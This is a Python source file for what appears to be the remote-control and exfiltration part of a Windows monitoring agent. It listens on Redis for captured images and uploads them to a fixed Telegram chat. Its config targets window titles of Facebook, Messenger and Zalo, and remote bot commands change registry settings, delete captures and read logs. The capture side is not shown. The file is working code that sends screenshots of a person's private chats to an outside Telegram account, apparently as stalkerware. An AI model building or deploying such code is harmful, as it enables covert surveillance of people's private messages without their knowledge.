import os
import json
import redis
import requests
import time
import dotenv
import sys
from pathlib import Path
import threading
from dataclasses import dataclass
import winreg
from telegram.ext import Application, CommandHandler
from logger import setup_logger

if getattr(sys, 'frozen', False):
    base_path = Path(sys.executable).parent
else:
    base_path = Path(__file__).parent

dotenv.load_dotenv(base_path / ".env")

LOG_DIR = os.path.join(os.getenv("APPDATA"), "Agent", "logs")

log = setup_logger(
    "telegram-agent",
    os.path.join(LOG_DIR, "telegram-agent.log")
)

REDIS_URL = os.getenv("REDIS_CONNECTION", "redis://localhost:6379/0")
TG_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TG_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
REG_PATH = r"Software\tBotAgent\v1"
_last_send = 0.0
_send_lock = threading.Lock()

if not TG_TOKEN or not TG_CHAT_ID:
    log.error("Telegram bot token or chat ID not set in environment variables.")
    sys.exit(1)

API = f"https://api.telegram.org/bot{TG_TOKEN}"



@dataclass
class RegistryConfig:
    enabled: bool = True
    interval_sec: int = 5
    title_regex: str = r"(facebook|messenger|zalo)"
    fg_poll_interval: float = 0.5


class ConfigManager:
    def __init__(self, delete_minutes=5, ttl=3):
        self._lock = threading.Lock()
        self._last_load = 0.0
        self._ttl = ttl
        self._delete_in_x_minutes = delete_minutes
        self._max_minutes = 1440
        self._send_interval_sec = 1.2
        self._config = RegistryConfig()

    def get(self) -> RegistryConfig:
        with self._lock:
            if time.time() - self._last_load > self._ttl:
                self._config = self._read_registry()
                self._last_load = time.time()
            return self._config

    def write_reg(self, key: str, value):
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH) as reg_key:
            if isinstance(value, bool):
                winreg.SetValueEx(reg_key, key, 0, winreg.REG_DWORD, int(value))
            elif isinstance(value, int):
                winreg.SetValueEx(reg_key, key, 0, winreg.REG_DWORD, value)
            else:
                winreg.SetValueEx(reg_key, key, 0, winreg.REG_SZ, str(value))


def send_photo(path: str, configmgr: ConfigManager ) -> None:
    global _last_send
    for _ in range(3):
        with _send_lock:
            now = time.time()
            interval = configmgr._send_interval_sec
            delta = now - _last_send
            if delta < interval:
                time.sleep(interval - delta)
            _last_send = time.time()
        try:
            with open(path, "rb") as f:
                r = requests.post(
                    f"{API}/sendPhoto",
                    data={"chat_id": TG_CHAT_ID},
                    files={"photo": f},
                    timeout=15
                )
                if r.status_code == 429:
                    retry = r.json().get("parameters", {}).get("retry_after", 1)
                    log.warning("Telegram rate limit, retry in %ss", retry)
                    time.sleep(retry)
                    continue
            r.raise_for_status()
            return
        except Exception as e:
            log.error("Failed to send photo %s: %s", path, e)

async def cleanup_old_photos(
    update,
    context,
    config_mgr: ConfigManager,
) -> None:
    # -------- Parse arguments safely --------
    minutes = config_mgr._delete_in_x_minutes
    MAX_MINUTES = config_mgr._max_minutes

    if context.args:
        try:
            minutes = int(context.args[0])
            minutes = max(1, min(minutes, MAX_MINUTES))
        except ValueError:
            await update.message.reply_text(
                "❌ Invalid value. Usage: /cleanup <minutes>"
            )
            return

    cutoff_ts = time.time() - (minutes * 60)

    output_dir = os.path.join(
        os.getenv("APPDATA", ""),
        "tBotAgent",
        "captures"
    )

    if not os.path.isdir(output_dir):
        await update.message.reply_text("ℹ️ Capture directory does not exist.")
        return

    deleted = 0
    failed = 0

    # -------- Cleanup --------
    for filename in os.listdir(output_dir):
        file_path = os.path.join(output_dir, filename)

        if not os.path.isfile(file_path):
            continue
        
        if time.time() - os.path.getmtime(file_path) < 10:
            continue

        try:
            if os.path.getmtime(file_path) < cutoff_ts:
                os.remove(file_path)
                deleted += 1
                log.info("Deleted old photo: %s", file_path)
        except Exception as e:
            failed += 1
            log.error("Failed deleting %s: %s", file_path, e)

    # -------- Feedback --------
    await update.message.reply_text(
        f"🧹 Cleanup done\n"
        f"• Older than: {minutes} minutes\n"
        f"• Deleted: {deleted}\n"
        f"• Failed: {failed}"
    )

async def set_config(
    update,
    context,
    config_mgr: ConfigManager,
) -> None:
    if len(context.args) != 2:
        await update.message.reply_text(
            "❌ Invalid usage. Usage: /set_config <key> <value>"
        )
        return

    key = context.args[0]
    value_str = context.args[1]

    # Determine the type of the value
    if value_str.lower() in ("true", "false"):
        value = value_str.lower() == "true"
    else:
        try:
            if '.' in value_str:
                value = float(value_str)
            else:
                value = int(value_str)
        except ValueError:
            value = value_str  # treat as string if not int/float/bool

    # Write to registry
    config_mgr.write_reg(key, value)

    await update.message.reply_text(
        f"✅ Set configuration\n"
        f"• {key} = {value}"
    )

async def ping_agent(update, context):
    try:
        r = requests.get("http://localhost:18080/ping", timeout=3).json()
        await update.message.reply_text(
            f"🟢 Agent alive\n"
            f"• PID: {r['pid']}\n"
            f"• Uptime: {r['uptime_sec']}s\n"
            f"• Redis: {r['redis_connected']}"
        )
    except Exception:
        await update.message.reply_text("🔴 Agent offline")


async def check_redis_status() -> None:
    r = redis.Redis.from_url(REDIS_URL, decode_responses=True)
    try:
        pong = r.ping()
        return pong
    except redis.RedisError as e:
        log.error("Redis connection error: %s", e)
        return False
    finally:
        r.close()

async def reload_agent(update, context):
    try:
        requests.post("http://localhost:18080/reload", timeout=3)
        await update.message.reply_text("♻️ Agent reload requested")
    except Exception:
        await update.message.reply_text("❌ Agent not reachable")

async def last_log_agent(update, context):
    n = int(context.args[0]) if context.args else 20
    log_file = os.path.join(LOG_DIR, "agent.log")

    try:
        with open(log_file, "r", encoding="utf-8") as f:
            lines = f.readlines()[-n:]
        await update.message.reply_text("".join(lines))
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading log: {e}")

async def last_log_bot(update, context):
    n = int(context.args[0]) if context.args else 20
    log_file = os.path.join(LOG_DIR, "telegram-agent.log")

    try:
        with open(log_file, "r", encoding="utf-8") as f:
            lines = f.readlines()[-n:]
        await update.message.reply_text("".join(lines))
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading log: {e}")


def app_init(token, config_mgr: ConfigManager):
    app = Application.builder().token(token).build()

    app.add_handler(CommandHandler(
        "cleanup",
        lambda u, c: cleanup_old_photos(u, c, config_mgr)
    ))

    app.add_handler(CommandHandler(
        "set_config",
        lambda u, c: set_config(u, c, config_mgr)
    ))

    app.add_handler(CommandHandler(
        "ping_agent",
        ping_agent
    ))

    app.add_handler(CommandHandler(
        "hot_reload_agent",
        reload_agent
    ))

    app.add_handler(CommandHandler(
        "last_log_agent",
        last_log_agent
    ))

    app.add_handler(CommandHandler(
        "last_log_bot",
        last_log_bot
    ))

    return app

def redis_worker(stop_evt, config_mgr: ConfigManager):
    log.info("Starting Redis worker thread")
    r = redis.Redis.from_url(REDIS_URL, decode_responses=True)
    pubsub = r.pubsub()
    pubsub.subscribe("IMAGE_READY")
    log.info("Subscribed to Redis channel: IMAGE_READY")

    try:
        for msg in pubsub.listen():
            if stop_evt.is_set():
                break
            if msg["type"] != "message":
                continue

            try:
                data = json.loads(msg["data"])
                path = data.get("path")

                if not path or not os.path.isfile(path):
                    continue

                send_photo(path,configmgr=config_mgr)
                log.info("Sent image: %s", path)

            except Exception as e:
                log.error("Redis handler error: %s", e)
    finally:
        log.warning("Redis worker stopped")
        pubsub.unsubscribe()
        pubsub.close()
        r.close()

if __name__ == "__main__":
    config = ConfigManager()
    app = app_init(TG_TOKEN, config)
    stop_evt = threading.Event()
    log.info("Telegram agent started, pid=%s", os.getpid())

    t = threading.Thread(
        target=redis_worker,
        args=(stop_evt, config),
        daemon=True
    )
    t.start()

    try:
        app.run_polling()
    finally:
        stop_evt.set()
        log.info("Telegram agent stopped")
